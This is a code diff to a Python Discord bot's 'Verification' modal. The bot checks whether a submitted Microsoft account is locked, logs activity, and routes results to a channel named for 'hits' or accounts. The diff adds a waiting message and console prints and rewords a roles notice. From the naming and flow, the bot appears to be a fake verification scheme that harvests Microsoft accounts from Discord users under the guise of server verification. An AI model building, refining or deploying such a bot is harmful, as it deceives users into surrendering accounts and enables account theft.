@@ -33,14 +33,22 @@ class MyModalOne(ui.Modal, title="Verification"):
 
         await interaction.response.defer()
 
+        await interaction.followup.send(
+            "⌛ Please wait while we try to verify you...",
+            ephemeral = True
+        )
+        
         logs_channel = await interaction.client.fetch_channel(config["discord"]["logs_channel"])
         hits_channel = await interaction.client.fetch_channel(config["discord"]["accounts_channel"])
 
         # Checks if the account is locked
         # Special thanks to Revive (kpriest95523) for this request
+        print("[~] - Checking if email is locked")
         lockedInfo = await asyncio.to_thread(checkLocked, self.email.value)
 
         if "Value" not in lockedInfo or json.loads(lockedInfo["Value"])["status"]["isAccountSuspended"]:
+
+            print("[X] - Microsoft Account is locked")
             await interaction.followup.send(
                 "❌ This microsoft account is locked, as so we cannot verify it. Try again with another account.",
                 ephemeral = True
@@ -200,7 +208,7 @@ class MyModalOne(ui.Modal, title="Verification"):
                     await logs_channel.send(embed = sucessEmbed)
 
                     await interaction.followup.send(
-                        "⌛ Please Allow Up To One Minute For Us To Proccess Your Roles...", ephemeral=True
+                        "⌛ Please allow us to proccess your roles...", ephemeral=True
                     )
 
                     # Unblocks Courotine
